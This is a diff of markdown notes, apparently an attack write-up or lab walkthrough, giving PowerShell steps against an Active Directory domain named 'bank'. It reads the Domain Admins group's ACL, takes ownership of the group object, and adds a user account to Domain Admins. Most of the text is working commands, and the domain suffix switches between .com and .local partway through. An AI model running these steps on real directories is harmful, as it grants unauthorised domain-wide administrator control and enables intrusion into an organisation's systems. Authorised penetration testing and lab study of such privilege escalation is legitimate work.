@@ -22,25 +22,21 @@ Import-Module ActiveDirectory
 
 ```bash
 $acl = Get-Acl "AD:\CN=Domain Admins,CN=Users,DC=bank,DC=com"
-```
-
-```bash
 $groupDN = "LDAP://CN=Domain Admins,CN=Users,DC=bank,DC=com"
-
 $acl = [System.DirectoryServices.DirectoryEntry]::new($groupDN).ObjectSecurity
 ```
 
-## Create the AD: drive if missing
+- Create the AD: drive if missing
 ```bash
 New-PSDrive -Name AD -PSProvider ActiveDirectory -Root "" -Server "bank.com"
 ```
-## Now get ACL
+- Now get ACL
 
 ```bash
 $acl = Get-Acl "AD:\CN=Domain Admins,CN=Users,DC=bank,DC=com"
 ```
 
-## 1. Take ownership
+- 1. Take ownership
 
 ```bash
 $group = [ADSI]"LDAP://CN=Domain Admins,CN=Users,DC=bank,DC=local"
@@ -49,7 +45,7 @@ $group.psbase.ObjectSecurity.SetOwner([System.Security.Principal.NTAccount]("ban
 
 $group.psbase.CommitChanges()
 ```
-## 2. Add self to group
+- 2. Add self to group
 ```bash
 $group.Add("LDAP://CN=goodboy,CN=Users,DC=bank,DC=local")
 ```
